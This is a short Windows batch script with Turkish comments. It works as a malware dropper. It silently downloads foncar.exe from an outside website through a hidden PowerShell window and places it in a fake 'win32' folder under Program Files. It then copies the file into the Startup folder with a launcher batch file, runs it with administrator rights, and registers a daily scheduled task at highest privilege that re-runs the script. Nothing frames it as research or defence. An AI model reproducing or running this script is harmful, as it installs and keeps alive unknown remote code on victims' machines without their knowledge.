@echo off

:: DOSYA YOLLARI
set "URL=https://bendahacokseviyorum.com/foncar.exe"
set "DOWNLOAD_PATH=%TEMP%\foncar.exe"
set "WIN32_FOLDER=C:\Program Files\win32"
set "EXE_DEST_PATH=%WIN32_FOLDER%\foncar.exe"
set "STARTUP_PATH=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\foncar.bat"

:: 1. WIN32 KLASÖRÜNÜ SİL VE YENİDEN OLUŞTUR
if exist "%WIN32_FOLDER%" rmdir /S /Q "%WIN32_FOLDER%"
mkdir "%WIN32_FOLDER%"

:: 2. WEB SİTESİNDEN DOSYAYI İNDİR
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%DOWNLOAD_PATH%')"

:: 3. ESKİ DOSYAYI SİLME VE YENİ DOSYAYI TAŞI
if exist "%EXE_DEST_PATH%" del "%EXE_DEST_PATH%"
move "%DOWNLOAD_PATH%" "%EXE_DEST_PATH%"

:: 4. EXE VE BAT DOSYALARINI STARTUP'A KOPYALAMA
copy "%EXE_DEST_PATH%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\foncar.exe" >nul
echo @echo off > "%STARTUP_PATH%"
echo start "" "%EXE_DEST_PATH%" >> "%STARTUP_PATH%"

:: 5. EXE DOSYASINI YÖNETİCİ İZİNİYLE ÇALIŞTIRMA
powershell -Command "Start-Process '%EXE_DEST_PATH%' -Verb runAs"

:: 6. KENDİNİ TEKRAR BAŞLATMA (EĞER ŞİFRE EKRANI YOKSA)
SCHTASKS /Query /TN "FoncarAutoRestart" >nul 2>&1
if %errorlevel% neq 0 (
    SCHTASKS /Create /TN "FoncarAutoRestart" /TR "%~f0" /SC DAILY /MO 1 /F /RL HIGHEST /IT /NP
)

exit
